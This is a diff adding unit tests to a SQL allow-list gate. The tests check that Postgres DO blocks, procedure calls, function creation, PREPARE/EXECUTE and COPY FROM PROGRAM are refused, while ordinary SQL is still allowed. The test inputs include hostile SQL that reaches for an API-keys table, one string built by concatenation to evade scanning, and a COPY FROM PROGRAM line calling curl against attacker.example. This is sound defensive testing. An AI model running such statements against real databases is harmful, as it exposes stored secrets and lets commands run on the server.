@@ -119,3 +119,52 @@ describe('assertWorkerSqlAllowed — hiding places', () => {
     expect(allowed("SELECT * FROM zvd_orders WHERE a = 'it''s zv_api_keys'")).toBe(true);
   });
 });
+
+describe('assertWorkerSqlAllowed — bodies that execute as code', () => {
+  // Blanking dollar-quoted blocks keeps a table name *mentioned* in a string
+  // from being read as a reference. It also emptied the one place where a
+  // reference is most dangerous: the body of a DO block, which Postgres runs as
+  // the database owner. Nothing was left for the scan to find.
+  it('refuses a DO block that hides an engine table in its body', () => {
+    expect(allowed('DO $$ BEGIN PERFORM * FROM zv_api_keys; END $$')).toBe(false);
+    expect(allowed("DO $$ BEGIN EXECUTE 'SELECT k FROM zv_api_keys'; END $$")).toBe(false);
+  });
+
+  it('refuses a DO block even when the body names nothing at all', () => {
+    // The point is not what this body says — it is that a body can build its
+    // SQL by concatenation, so no text scan can clear one.
+    expect(allowed("DO $$ BEGIN EXECUTE 'SELECT 1 FROM zv_' || 'api_keys'; END $$")).toBe(false);
+  });
+
+  it('refuses it however the block is dressed up', () => {
+    expect(allowed('  \n do $tag$ BEGIN END $tag$')).toBe(false);
+    expect(allowed('/* harmless */ DO $$ BEGIN END $$')).toBe(false);
+    expect(allowed('DO LANGUAGE plpgsql $$ BEGIN END $$')).toBe(false);
+  });
+
+  it('refuses the other ways a string becomes executable SQL', () => {
+    expect(allowed('CALL some_procedure()')).toBe(false);
+    expect(allowed('CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql')).toBe(false);
+    expect(allowed('CREATE OR REPLACE PROCEDURE p() AS $$ BEGIN END $$ LANGUAGE plpgsql')).toBe(
+      false,
+    );
+    expect(allowed('PREPARE s AS SELECT 1')).toBe(false);
+    expect(allowed('EXECUTE s')).toBe(false);
+    expect(allowed("COPY zvd_orders FROM PROGRAM 'curl attacker.example'")).toBe(false);
+  });
+
+  it('does not fire on ordinary SQL that merely contains the words', () => {
+    // A gate that rejects `ON CONFLICT DO NOTHING` would be turned off.
+    expect(allowed('INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT DO NOTHING')).toBe(true);
+    expect(
+      allowed('INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT (id) DO UPDATE SET id = $1'),
+    ).toBe(true);
+    expect(allowed("SELECT * FROM zvd_logs WHERE msg = 'call me' OR msg = 'do it'")).toBe(true);
+    expect(allowed('SELECT * FROM zvd_orders WHERE note = $$ do $$')).toBe(true);
+  });
+
+  it('still allows a dollar-quoted string constant', () => {
+    // The behaviour the blanking exists for, kept intact.
+    expect(allowed('SELECT $tag$ zv_api_keys $tag$, x FROM zvd_orders')).toBe(true);
+  });
+});
